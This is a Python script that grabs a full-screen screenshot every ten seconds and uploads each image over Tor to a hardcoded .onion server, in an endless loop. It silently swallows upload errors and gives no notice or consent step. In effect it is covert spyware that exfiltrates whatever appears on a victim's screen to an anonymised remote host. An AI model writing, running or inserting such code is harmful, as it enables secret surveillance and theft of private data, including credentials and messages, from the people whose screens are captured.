
# pip install requests[socks]

import os
import time
import requests
from PIL import ImageGrab
from datetime import datetime
import schedule

# Configuration
SAVE_DIR = os.path.join(os.getcwd(), "screenshots")  # Ensure absolute path
# UPLOAD_URL = "http://127.0.0.1:5000/upload_screenshot"
UPLOAD_URL = "http://q5v7z4tnlrd5qgrk2w3pfyk6kpyfbc5ssjv3lc64fwz3yjuidj5mprad.onion:9050/upload_screenshot" 

# Ensure the directory for saving screenshots exists
os.makedirs(SAVE_DIR, exist_ok=True)

def take_screenshot():
    """Take a screenshot and save it locally."""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(SAVE_DIR, f"{timestamp}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(filepath, "PNG")
        print(f"\nScreenshot saved to {filepath}")
        return filepath
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        return None  # Return None if there was an error

def upload_screenshot(filepath):
    """Upload the screenshot to the server via the Tor network."""
    with open(filepath, "rb") as file:
        files = {"file": file}
        proxies = {
            "http": "socks5h://127.0.0.1:9050",  # Tor's default SOCKS5 proxy
            "https": "socks5h://127.0.0.1:9050",
        }
        try:
            response = requests.post(UPLOAD_URL, files=files, proxies=proxies, timeout=30)
            if response.status_code == 200:
                print(f"Screenshot {filepath} uploaded successfully!")
            else:
                print(f"Failed to upload {filepath}: {response.status_code} - {response.text}")
        except requests.exceptions.RequestException as e:
            # print(f"Error uploading screenshot: {e}")
            pass

def job():
    """Take and upload a screenshot."""
    try:
        filepath = take_screenshot()
    except:
        filepath = ''
    upload_screenshot(filepath)

# Schedule the task every 10 seconds
schedule.every(10).seconds.do(job)

# Main loop to keep the scheduler running
print("Starting the auto-screenshot uploader...")
while True:
    schedule.run_pending()
    time.sleep(1)

